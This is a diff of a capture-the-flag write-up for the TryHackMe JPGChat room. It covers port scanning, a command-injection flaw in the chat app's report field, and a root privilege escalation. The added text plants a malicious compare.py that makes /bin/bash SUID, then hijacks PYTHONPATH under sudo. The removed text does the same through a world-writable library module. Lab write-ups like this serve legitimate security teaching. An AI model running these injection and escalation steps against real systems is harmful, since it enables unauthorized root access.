@@ -1,5 +1,4 @@
 > JPGChat writeup | Tuesday 29th December
-
 > https://tryhackme.com/jr/jpgchat
 
 # Recon / Enum
@@ -7,7 +6,6 @@
 ---------------
 
 Starting of with a classic nmap scan will reveal that there are 2 ports open.
-
 Specifically port 22 and 3000.
 
 `nmap -sC -sV -p- -v 10.10.166.220`
@@ -28,7 +26,6 @@ Specifically port 22 and 3000.
 ```
 
 Now 22 is just ssh, but 3000 is "JPChat"?
-
 Now we can see that the source code for the application is at the admins github.
 
 Lets try to connct to the application to check if we can find the source code.
@@ -52,7 +49,6 @@ There are currently 0 other users logged in
 As we can see, there are currently no users logged in.
 
 After poking around at this `[MESSAGE]` form, there appears to be nothing useful.
-
 But we should check out the `[REPORT]` form aswell.
 
 ```
@@ -62,13 +58,11 @@ your name:
 ```
 
 As we can see, the report will be read by Mozzie-jpg!
-
 That must be the admins alias, lets check github for him!
 
 # Enumerating the application
 
 After visiting the admins github, i have found the source code.
-
 Here is the source code
 
 ```python
@@ -121,7 +115,6 @@ The echo command, well echoes something to the terminal or it can be redirected 
 ### BUT, in this situasion it isn't properly handled!!!
 
 The echo command should be surrounded by quotes, especially if it is going to be passed user input.
-
 This can be exploited with a simple `;`, as it isn't surrounded by quotes, we should be able to run an extra command.
 
 We can test this locally before firing it at the target. (AS YOU SHOULD)
@@ -132,7 +125,6 @@ test
 ➜  writeup: 
 ```
 Now this only returns "test", why is that?
-
 Lets try to cat out the file, just to see whats in it.
 
 ```
@@ -190,103 +182,56 @@ Now that we have a stable shell + persistence, we can now move on to privilege e
 
 The first thing i do whenever i get on a box, is check for anything i can run as sudo
 
-```bash
-wes@ubuntu-xenial:~$ sudo -l
+```
 Matching Defaults entries for wes on ubuntu-xenial:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    mail_badpass, env_keep+=PYTHONPATH
 
 User wes may run the following commands on ubuntu-xenial:
-    (root) NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
-wes@ubuntu-xenial:~$ 
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
 ```
 
-We can run `test_module.py` as root!
+Now what i want you to notice is the `env_keep`, this means that when we run something with sudo, it will keep that variable.
 
-Lets go check that file out!
+But first lets go check out that `test_module.py` file.
 
 ```
 wes@ubuntu-xenial:~$ cd /opt/development/
 wes@ubuntu-xenial:/opt/development$ ls -la
 total 12
-drwxr-xr-x 2 root root 4096 Dec 28 23:06 .
-drwxr-xr-x 4 root root 4096 Dec 28 23:06 ..
--rw-r--r-- 1 root root   93 Dec 28 23:20 test_module.py
+drwxr-xr-x 2 root root 4096 Jan 15 18:58 .
+drwxr-xr-x 4 root root 4096 Jan 15 18:58 ..
+-rw-r--r-- 1 root root   93 Jan 15 18:58 test_module.py
 wes@ubuntu-xenial:/opt/development$ cat test_module.py 
 #!/usr/bin/env python3
-
 from compare import *
-
 print(compare.Str('hello', 'hello', 'hello'))
-
-wes@ubuntu-xenial:/opt/development$ 
-
-```
-
-So it starts with importing a module named `compare`?
-
-I haven't heard of that module before, we should probably check out that module
-
-Now these modules are usually stored in /usr/lib/python/, But in this scenario we should find it using the `find` command
-
-```
-wes@ubuntu-xenial:/opt/development$ find / -name compare.py 2>/dev/null
-/usr/lib/python3.5/compare.py
 wes@ubuntu-xenial:/opt/development$ 
 ```
-So lets jump over to that directory and check out that module!
+
+So it imports a module named `compare`, now we can modify the PYTHONPATH variable to a directory which we can write into.
+
+And we can then write our own malicious compare.py file, which in my case i wrote this into it
+
+```python
+import os
+
+os.system("chmod +s /bin/bash")
+```
+
+if you write that into say /dev/shm/compare.py
+and have set your PYTHONPATH variable to /dev/shm, this command should execute as root.
+`export PYTHONPATH=/dev/shm`
 
 ```
-wes@ubuntu-xenial:~$ cd /usr/lib/python3.5/
-wes@ubuntu-xenial:/usr/lib/python3.5$ cat compare.py 
-class compare:
-
-	def Str(self, x, y,):
-		x = str(x)
-		y = str(y)
-
-		if x == y:
-			return True;
-		else:
-			return False;
-
-	def Int(self, x, y,):
-		x = int(x)
-		y = int(y)
-
-		if x == y:
-			return True;
-		else:
-			return True;
-
-	def Float(self, x, y,):
-		x = float(x)
-		y = float(y)
-
-		if x == y:
-			return True;
-		else:
-			return False;
-wes@ubuntu-xenial:/usr/lib/python3.5$ ls -la compare.py 
--rw-rw-rw- 1 root root 335 Dec 28 23:20 compare.py
-wes@ubuntu-xenial:/usr/lib/python3.5$ 
-```
-### We can write to the module!
-
-Now this means that we can write our own code into that module, and make it execute any command through the `os` module as i mentioned earlier!
-
-So lets try to put in some code which will make bash SUID, effectively making us root instantly
-
-<img src="privesc.png" />
-
-Now lets try to execute the only sudo command we can run without a password!
-
-```
-wes@ubuntu-xenial:/usr/lib/python3.5$ sudo /usr/bin/python3 /opt/development/test_module.py 
-True
-wes@ubuntu-xenial:/usr/lib/python3.5$ ls -l /bin/bash 
+wes@ubuntu-xenial:/opt/development$ sudo python3 /opt/development/test_module.py
+Traceback (most recent call last):
+  File "/opt/development/test_module.py", line 5, in <module>
+    print(compare.Str('hello', 'hello', 'hello'))
+NameError: name 'compare' is not defined
+wes@ubuntu-xenial:/opt/development$ ls -l /bin/bash
 -rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
-wes@ubuntu-xenial:/usr/lib/python3.5$ 
+wes@ubuntu-xenial:/opt/development$ 
+
 ```
 
 ### Now bash is SUID root!
